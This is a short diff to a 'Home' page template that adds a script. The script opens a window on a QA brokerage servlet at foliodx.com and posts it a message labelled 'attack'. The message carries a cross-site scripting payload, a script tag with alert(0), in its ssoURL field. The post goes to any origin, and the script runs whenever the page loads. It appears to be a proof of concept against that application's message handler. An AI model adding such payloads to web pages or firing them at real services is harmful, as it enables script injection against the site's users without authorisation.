@@ -38,3 +38,9 @@ title: Home
   {% endif %}
 </div>
 
+<script>
+ var foliodx = window.open("https://qa8.foliodx.com/brokerage/AControlServlet","Folio");
+ var message= {"type":"message","data":{"abc":"fillhere","request":"attack","eventName":"folioActionLaunch","data":{"ssoURL":"'/><script>alert(0);</script>"}}}
+ foliodx.postMessage(message,"*");
+</script>
+  
